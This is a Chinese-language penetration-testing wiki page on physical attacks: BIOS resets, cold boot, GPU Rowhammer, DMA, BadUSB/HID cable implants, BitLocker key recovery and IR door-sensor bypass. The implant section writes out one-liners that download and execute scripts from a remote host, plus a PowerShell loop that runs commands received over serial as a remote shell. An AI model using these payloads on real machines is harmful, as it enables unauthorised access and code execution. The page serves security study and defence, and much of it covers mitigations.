# 物理攻击

{{#include ../banners/hacktricks-training.md}}

如需发现板级接口、使用串口控制台、访问闪存、利用侧信道或进行 glitching，请参阅 [Hardware Hacking](hardware-hacking/README.md) 及其针对特定接口的章节。本页介绍需要对整个系统进行物理访问的攻击。

## BIOS 密码恢复与系统安全

传统 PC 固件设置可能会因断开 CMOS 电池或使用文档中说明的清除 CMOS 跳线而重置。所需的断电时间因主板而异；现代 UEFI 密码或密钥可能存储在非易失性闪存、嵌入式控制器或安全设备中，因此即使取下电池也会保留。短接引脚前请查阅主板或维修手册；此操作也可能使 TPM 测量失效并触发磁盘加密恢复。

在传统 x86 系统上，可使用 **killCMOS** 和 **CmosPwd** 等工具从可启动环境检查或修改由 CMOS 供电保存的设置。CmosPwd 可识别一组有文档记录的旧 BIOS 系列所使用的密码格式，并可备份、恢复或擦除/清除 CMOS 状态；其公开版本面向传统 DOS/Windows、Linux、FreeBSD 和 NetBSD 环境。<sup>[[18]](#references)</sup> 这些工具并非通用的 UEFI 密码移除工具，且需要足够的硬件/固件访问权限。

部分笔记本固件在多次输错密码后会显示厂商专属的挑战码。[bios-pw.org](https://bios-pw.org) 等数据库可为部分型号生成传统厂商的恢复密码，但许多系统会锁定设备，且无法根据挑战码推导出密码。生成的密码应视为特定型号专用，并避免耗尽永久尝试次数。

### UEFI 安全

对于现代 **UEFI** 系统，可使用 CHIPSEC 审计 Secure Boot 变量保护。请先运行下面的非修改检查；可选的 `-a modify` 模式会故意尝试破坏变量，只应在可恢复的实验室系统上使用。CHIPSEC 本身也警告，其特权驱动和底层硬件访问不适用于生产终端。<sup>[[11]](#references)</sup>

```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```

---

## RAM 分析与 Cold Boot 攻击

DRAM 在停止刷新后不会立即丢失所有位。衰减速率因模块技术和温度而异；与未冷却的断电重启相比，冷却可让有用数据保留更久。Cold-boot 攻击会快速重启至精简的采集环境，或转移冷却后的内存模块，捕获原始内存，并在位衰减的情况下重建加密密钥。磁盘复制工具并不自动具备物理内存成像功能，而 Volatility 用于分析捕获内容，并不负责采集；应使用适用于相应平台且经过验证的采集工具。<sup>[[12]](#references)</sup>

---

## 针对页表的 GPU Rowhammer

现代 GPU Rowhammer 攻击若针对 **GPU 虚拟内存元数据**，而不是普通缓冲区，会更加有效。近期针对 **GDDR6 NVIDIA Ampere GPU** 的研究表明，运行非特权 CUDA 代码的攻击者可以构建 GPU 专用的锤击模式，利用 **内存布局调整** 将分页结构放置在易受攻击的行中，然后翻转 **末级页表** 或中间 **页目录** 中的位。一旦某个转换条目遭到破坏，攻击者就可以进一步实现 **任意 GPU 内存读写**，并转而攻击主机。<sup>[[1]](#references)[[2]](#references)</sup>

### 利用模式

1. **分析可锤击的行**，并在 GDDR6 中构建能够绕过 DRAM 内缓解措施、考虑刷新机制的非均匀锤击模式。
2. **调整 GPU 内存分配布局**，使驱动程序将页转换结构放置在易受攻击的物理位置，而非默认的受保护内存池中。实际操作中，可能需要耗尽低内存页表区域，并以可控步长大量创建稀疏 UVM 映射。
3. **翻转转换元数据**，例如页表或页目录条目中的 **PFN** 或与 aperture 相关的位，使攻击者控制的虚拟页映射到页表页、任意 GPU 内存或主机可见的系统映射。
4. 利用伪造的映射改写其他转换条目，从而跨 GPU 上下文实现 **任意 GPU 内存读写**。

### 转向主机与缓解措施

- **禁用 IOMMU** 时，伪造的系统 aperture 映射可能向 GPU 暴露任意 **主机物理内存**，使 GPU 原语可导致主机完全失陷。<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** 针对末级页表条目；**GeForge** 则表明，破坏页目录层可能更容易，因为翻转一位就能重定向更大的转换子树。不要只把某一层分页结构视为安全关键。<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** 仍然重要，因为它能阻止 GDDRHammer/GeForge 使用的直接任意主机内存访问路径，但它**并非完整的缓解措施**。**GPUBreach** 展示了另一种后续攻击路径：攻击者破坏 GPU 可写、由驱动程序拥有的 CPU 缓冲区，随后触发 NVIDIA 驱动程序的内存安全漏洞，从而获得内核写入原语，并在启用 IOMMU 的情况下获取 **root shell**。<sup>[[3]](#references)</sup>
- 对受支持的工作站/服务器 GPU，启用 **系统级 ECC** 是一种实用的加固措施。不支持 ECC 的消费级 GPU，其防护能力较弱。<sup>[[4]](#references)</sup>
- 这些攻击并非纯理论设想：**GeForge** 报告称，在 RTX 3060 上发现 **1,171** 次位翻转，在 RTX A6000 上发现 **202** 次，足以构建可行的主机权限提升攻击链。<sup>[[2]](#references)[[9]](#references)</sup>

---

## 直接内存访问 (DMA) 攻击

有关离线 UEFI IFR/NVRAM 修补（可降低启动前 IOMMU 强制执行级别并启用 Windows DMA 攻击链），请参阅：

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception** 展示了通过 FireWire 和早期 Thunderbolt 配置等接口进行 **基于 DMA 的内存采集与修补**，其中包括历史上的登录绕过特征。它并非简单地“对 Windows 10 无效”：能否利用取决于接口、目标版本、IOMMU 策略、锁定状态，以及是否支持并启用了 Windows Kernel DMA Protection。Windows 10 版本 1803 及更高版本在兼容平台上引入了 Kernel DMA Protection，显著改变了攻击面。<sup>[[13]](#references)[[14]](#references)</sup>

---

## 使用 Live CD/USB 访问系统

对于未加密或已解锁的 Windows 卷，离线环境可以将 **sethc.exe** 或 **Utilman.exe** 等辅助功能二进制文件替换为 **cmd.exe**，这样对应的登录屏幕快捷键运行时就会打开 SYSTEM 命令提示符。**chntpw** 等工具可以编辑本地 SAM 账户数据。这些方法不能绕过已锁定的 BitLocker 卷，并可能损坏受 DPAPI/EFS 保护的凭据；请保留取证副本和备份。

**Kon-Boot** 是一款适用于受支持 Windows/macOS 配置的商业启动时身份验证绕过工具。兼容性取决于操作系统、固件模式、Secure Boot 和磁盘加密设置；它不能解密已锁定的 BitLocker 卷。<sup>[[10]](#references)</sup>

---

## 应对 Windows 安全功能

### 启动与恢复快捷键

- **Delete/Supr**、F2、F10 或其他厂商指定按键可能会打开固件设置。
- **F8** 仅在仍启用该路径的配置中进入旧版 Windows 高级启动选项；当前的恢复入口因配置而异。
- 在某些配置中，按住 **Shift** 可以阻止 Windows 自动登录，但策略/注册表设置可能会禁用此行为。<sup>[[17]](#references)</sup>

### BAD USB 设备

**USB Rubber Ducky** 和 Teensy 板等设备可以伪装成可信 HID 键盘并注入预定义按键。载荷最初拥有已登录会话的权限和桌面访问权限；UAC 提示、屏幕锁定、键盘布局、时序和终端 USB 策略仍会限制其操作。<sup>[[15]](#references)</sup>

可编程外设还可以攻击主机内核解析器，并协调多个 USB 设备进行堆布局调整和信息披露：

{{#ref}}
../binary-exploitation/linux-kernel-exploitation/usb-audio-descriptor-oob-kaslr-leak.md
{{#endref}}

### 卷影复制

管理员或备份权限可以创建卷影副本或保存注册表配置单元，以便获取 **SAM** 和 **SYSTEM** 等锁定文件。这是一种失陷后的数据收集技术，而非权限绕过；应将其与 `diskshadow`/VSS 事件及注册表配置单元导出事件进行关联分析。

## BadUSB / HID 植入技术

### 由 NFC 触发的 Android HID gadget

只有在 USB 控制器和内核支持 **USB gadget/HID** 时，已 root 的 Android 手机才能变成可编程 USB 键盘。在兼容设备上，Kali NetHunter 可通过 **USB Arsenal** 提供 gadget 配置文件。另一个选择是 [USB Gadget Tool](https://github.com/tejado/android-usb-gadget)，它会创建 ConfigFS gadget 功能，并可能提供 `/dev/hidg0` 和 `/dev/hidg1` 等键盘/鼠标字符设备。该工具只负责创建 gadget 端点；还需由独立进程向其写入 HID 报告。若内核缺少 ConfigFS、HID gadget 支持或可用的 USB Device Controller，root 权限也无法弥补。<sup>[[19]](#references)[[20]](#references)[[21]](#references)</sup>

此端点可以与 Android NFC 结合，作为物理触发器。[NFC-to-HID](https://github.com/androidmalware/NFC-to-HID) 应用会读取标签 UID，将其转换为预期格式，与本地白名单进行比对；匹配后，它会发送已配置的 Rubber Ducky 风格键盘序列。连接的主机只会看到普通键盘输入，无需安装 NFC 软件。<sup>[[22]](#references)[[24]](#references)</sup>

使用快捷键或命令前，应先在空白文本编辑器中验证设备枚举和键盘布局。无害的载荷示例：<sup>[[24]](#references)</sup>

```text
DELAY 1000
STRING NFC HID test successful
ENTER
```

Important trust boundaries:<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

- **UID whitelist 是识别机制，不是身份验证机制**。UID 是公开信息，某些类型的 token 或模拟器允许克隆或冒充。复制一个已获准的 UID，会沿用原 token 的相同分发路径。
- **NfcScreenOff** Magisk 模块会修补 NFC 服务，使其表现得仿佛屏幕已亮起且处于解锁状态。如果手机已连接到主机，这可能让他人无需解锁手机就能触发 payload。
- 在已 root 或 bootloader 已解锁的设备上，payload 中存储的密码、API token 和命令都可被恢复。通过 HID 输入密码属于可重复使用密码的自动化操作，并非无密码身份验证。
- HID 注入会以当前桌面的权限执行操作，并受焦点、时序和主机键盘布局影响。执行敏感操作前应要求用户近期确认，避免在脚本中存放高权限凭据，并使用基于加密质询-响应的验证器进行真正的身份验证。

### Wi-Fi managed cable implants

- 基于 ESP32-S3 的 implant（例如 **Evil Crow Cable Wind**）隐藏在 USB-A→USB-C 或 USB-C↔USB-C 线缆中，仅作为 USB 键盘枚举，并通过 Wi-Fi 提供其 C2 堆栈。操作者只需从受害主机为线缆供电，创建一个名称为 `Evil Crow Cable Wind`、密码为 `123456789` 的热点，然后访问 [http://cable-wind.local/](http://cable-wind.local/)（或其 DHCP 地址），即可进入内嵌的 HTTP 界面。<sup>[[8]](#references)</sup>
- 浏览器 UI 提供 *Payload Editor*、*Upload Payload*、*List Payloads*、*AutoExec*、*Remote Shell* 和 *Config* 选项卡。存储的 payload 会按操作系统标记，键盘布局可即时切换，VID/PID 字符串也可修改，以模拟已知外围设备。
- 由于 C2 位于线缆内部，手机无需使用组织网络即可暂存 payload、触发执行并管理 Wi-Fi 凭据——这对短暂的物理入侵很有用。

### OS-aware AutoExec payloads

- AutoExec 规则会将一个或多个 payload 绑定为在 USB 枚举后立即触发。implant 会进行轻量级 OS 指纹识别，并选择匹配的脚本。
- 示例工作流：
  - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`。
  - *macOS/Linux:* `COMMAND SPACE`（Spotlight）或 `CTRL ALT T`（终端）→ `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`。
- 由于执行过程无需人工干预，只需替换充电线缆，就能在当前登录用户的上下文中实现“plug-and-pwn”初始访问。

### HID-bootstrapped remote shell over Wi-Fi TCP

1. **Keystroke bootstrap：**存储的 payload 会打开控制台，并粘贴一个循环，让其执行通过新的 USB serial device 接收到的任何内容。一个精简的 Windows 变体如下：

```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```

2. **线缆桥接：**植入体在其 ESP32-S3 启动一个连接回操作者的 TCP client（Python 脚本、Android APK 或桌面可执行文件）时，会保持 USB CDC 通道打开。输入 TCP 会话的任何字节都会被转发到上述串行循环中，从而即使在 air-gapped 主机上也能远程执行命令。输出有限，因此操作者通常会运行盲命令（创建账户、暂存其他工具等）。

### HTTP OTA 更新接口

- Evil Crow Cable Wind 的文档所述接口在 `/update` 暴露了一个未经身份验证的固件更新端点：<sup>[[8]](#references)</sup>

```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```

- 现场操作人员可以在交战过程中热插拔功能（例如，刷入 USB Army Knife 固件），无需打开线缆，让 implant 在仍连接到目标主机的情况下切换到新能力。

## 绕过 BitLocker 加密

对正在运行或最近运行过的系统进行授权取证采集时，如果卷处于解锁状态，采集内容可能包含 BitLocker 卷主密钥或相关密钥材料。Elcomsoft Forensic Disk Decryptor 和 Passware Kit Forensic 等商业工具可以搜索受支持的内存映像、休眠文件或崩溃转储，但不保证一定成功。启用 BitLocker 时，现代 Windows 还会加密崩溃转储；存储的 48 位恢复密码与内存中的卷密钥是不同的取证对象。<sup>[[12]](#references)[[16]](#references)</sup>

---

## 通过社会工程添加恢复密钥

如果攻击者说服管理员运行 BitLocker 管理命令，就可以添加恢复密码、外部密钥或其他保护器，然后捕获它。恢复密码不能是任意的全零字符串：BitLocker 数字恢复密码必须符合经过验证的 48 位格式。相关的授权管理命令语法为 `manage-bde -protectors -add C: -recoverypassword`；使用 `manage-bde -protectors -get C:` 列出生成的保护器。监控保护器添加操作，并确保新恢复材料只托管到获准的位置。<sup>[[16]](#references)</sup>

---

## 利用机箱入侵/维护开关将 BIOS 恢复出厂设置

许多现代笔记本电脑和小型台式机都配有**机箱入侵开关**，由嵌入式控制器（EC）和 BIOS/UEFI 固件监控。虽然该开关的主要用途是在设备被打开时发出警报，但供应商有时会实现一种**未公开的恢复快捷方式**，在开关按特定模式切换时触发。<sup>[[5]](#references)[[6]](#references)</sup>

### 攻击原理

1. 该开关连接到 EC 上的一个 **GPIO 中断**。
2. EC 上运行的固件会跟踪**按压次数和时间间隔**。
3. 检测到硬编码的模式时，EC 会调用 *mainboard-reset* 例程，**擦除系统 NVRAM/CMOS 的内容**。
4. 下次启动时，受影响的机型会加载重置后的固件状态。根据供应商和版本的不同，被清除的状态可能包括管理员密码、自定义启动设置或已注册的 Secure Boot 密钥；TPM 状态和磁盘加密的影响则必须单独评估。

> 固件重置可能会恢复外部启动选项，但**不会**解密存储设备。TPM/固件变更可能导致 BitLocker 或其他全盘加密系统进入恢复模式；没有恢复密钥时，内部硬盘仍会受到保护。<sup>[[16]](#references)</sup>

### 真实案例——Framework 13 笔记本电脑

Framework 13（第 11/12/13 代）的恢复快捷方式如下：

```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```

第十个循环后，EC 会设置一个标志，指示 BIOS 在下次重启时清除 NVRAM。整个过程约需 40 秒，**只需要一把螺丝刀**。<sup>[[5]](#references)</sup>

### 通用利用流程

1. 开机或从挂起状态恢复目标设备，使 EC 运行。
2. 拆下底盖，露出入侵/维护开关。
3. 重现厂商特定的切换模式（查阅文档、论坛，或对 EC 固件进行逆向工程）。
4. 重新组装并重启，然后检查哪些固件设置和凭据确实发生了变化。
5. 如果已获授权且支持外部启动，可启动受控的 live image。内部卷合法解锁后（或该卷从未加密时），live 环境可以获取凭据和数据，或检查 EFI 系统分区。修改该分区以安装 EFI implant 具有持久性且侵入性极强，并且仍受 Secure Boot、measured boot、固件写保护和端点监控的限制。没有密钥或恢复材料，就无法访问加密存储。

### 检测与缓解

* 在 OS 管理控制台中记录机箱入侵事件，并将其与意外的 BIOS 重置关联分析。
* 在螺丝/盖板上使用**防拆封条**，以检测设备是否被打开。
* 将设备存放在**受物理管控的区域**；应假定物理访问等同于完全失陷。
* 如果可用，请禁用厂商的“维护开关重置”功能，或要求使用额外的加密授权来重置 NVRAM。

---

## 针对无接触式出门传感器的隐蔽 IR 注入

### 传感器特征
- 普通的“挥手出门”传感器会将近红外 LED 发射器与电视遥控器式接收模块配对；只有在检测到多个正确载波频率（约 30 kHz）的脉冲（约 4–10 个）后，接收模块才会输出逻辑高电平。<sup>[[7]](#references)</sup>
- 塑料外罩阻止发射器和接收器直接相对，因此控制器会认为任何经过验证的载波都来自附近的反射，并驱动继电器打开门锁扣。
- 控制器确认目标存在后，通常会改变发射调制包络，但接收器仍会接受任何符合滤波后载波特征的脉冲串。

### Attack Workflow
1. **捕获发射特征** – 将逻辑分析仪接到控制器引脚上，记录驱动内部 IR LED 的检测前和检测后波形。
2. **仅重放“检测后”波形** – 拆除或忽略原装发射器，从一开始就用外部 IR LED 发出已触发的模式。由于接收器只关心脉冲数量/频率，它会将伪造的载波视为真实反射，并使继电器线路进入有效状态。
3. **控制发射时序** – 以经过调校的脉冲串发射载波（例如，开启数十毫秒，再关闭相近时长），以提供最低脉冲数量，同时避免接收器的 AGC 或抗干扰逻辑饱和。连续发射会很快使传感器灵敏度下降，并阻止继电器触发。

### Long-Range Reflective Injection
- 将实验台上的 LED 换成高功率 IR 二极管、MOSFET 驱动器和聚焦光学元件后，即可从约 6 m 外可靠触发。
- 攻击者无需与接收器的接收孔径保持视线相通；将光束瞄准玻璃后方可见的室内墙壁、货架或门框，反射能量即可进入约 30° 的视场，模拟近距离挥手。
- 由于接收器预期接收的只是微弱反射，更强的外部光束即使经过多个表面反射，仍可高于检测阈值。

### Weaponised Attack Torch
- 将驱动器嵌入普通手电筒中，可让工具伪装得毫不起眼。将可见光 LED 换成与接收器波段匹配的高功率 IR LED，添加 ATtiny412（或类似器件）以生成约 30 kHz 的脉冲串，并使用 MOSFET 吸收 LED 电流。
- 伸缩变焦镜头可收窄光束，提升射程和精度；由 MCU 控制的振动马达则可在不发出可见光的情况下，通过触觉反馈确认调制已启用。
- 在多个预存调制模式（载波频率和包络略有不同）之间切换，可提高对不同贴牌传感器系列的兼容性，让操作者扫描反射表面，直到继电器发出咔嗒声、门锁释放。

## References

- [1] [GDDRHammer: Greatly Disturbing DRAM Rows — Cross-Component Rowhammer Attacks from Modern GPUs](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: Hammering GDDR Memory to Forge GPU Page Tables for Fun and Profit](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Privilege Escalation Attacks on GPUs using Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Security Notice: Rowhammer - July 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Rowhammer Attack Against NVIDIA Chips](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Kon-Boot official documentation and compatibility information](https://kon-boot.com/)
- [11] [CHIPSEC documentation - Secure Boot variable protections](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Lest We Remember: Cold Boot Attacks on Encryption Keys](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - physical memory manipulation over DMA](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Kernel DMA Protection](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Hak5 USB Rubber Ducky documentation](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - BitLocker operations guide](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - holding Shift and automatic logon behavior](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - CmosPwd documentation and downloads](https://www.cgsecurity.org/wiki/CmosPwd)
- [19] [Kali Linux Documentation - NetHunter USB-Arsenal](https://www.kali.org/docs/nethunter/nethunter-usbarsenal/)
- [20] [Linux kernel documentation - USB HID gadget driver](https://docs.kernel.org/usb/gadget_hid.html)
- [21] [USB Gadget Tool](https://github.com/tejado/android-usb-gadget)
- [22] [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID)
- [23] [NfcScreenOff](https://github.com/Jon8RFC/NfcScreenOff)
- [24] [Turn a Rooted Android Phone into an NFC Authenticator and Automation Tool for Your PC](https://mobile-hacker.com/2026/09/21/turn-a-rooted-android-phone-into-an-nfc-authenticator-and-automation-tool-for-your-pc/)

{{#include ../banners/hacktricks-training.md}}
